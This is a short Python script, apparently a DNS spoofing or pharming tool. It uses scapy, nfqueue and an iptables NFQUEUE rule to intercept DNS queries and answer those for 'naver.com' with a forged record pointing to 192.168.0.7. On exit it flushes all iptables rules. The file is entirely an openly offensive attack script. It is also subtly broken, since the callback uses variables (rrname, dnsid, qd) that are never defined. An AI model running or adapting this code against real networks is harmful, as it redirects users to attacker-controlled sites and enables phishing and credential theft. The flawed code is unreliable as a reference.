from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
import nfqueue
import socket
import os

pharming_target = 'naver.com'
pharming_site = '192.168.0.7'


def dnsSpoof(dummy, payload):
    data = payload.get_data()
    packet = IP(data)

    dstip = packet[IP].src
    srcip = packet[IP].dst
    sport = packet[UDP].sport
    dport = packet[UDP].dport

    if pharming_target in rrname:
        P_IP = IP(dst=dstip, src=srcip)
        P_UDP = UDP(dport=dport, sport=sport)
        dnsrr = DNSRR(rrname=rrname, ttl=10, rdata=pharming_site)
        P_DNS = DNS(id=dnsid, qr=1, aa=1, qd=qd, an=dnsrr)
        spoofPacket = P_IP / P_UDP / P_DNS
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofPacket), len(spoofPacket))
        print('+DNS SPOOFING [{}] -> [{}]'.format(pharming_target, pharming_site))

def main():
    print('+++ DNS SPOOF START...')
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')

    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(dnsSpoof)
    q.create_queue(0)
    try:
        q.try_run()
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        os.system('iptables -F')
        os.system('iptables -X')
        print('\n---RECOVER IPTABLES...')
        return

if __name__ == "__main__":
    main()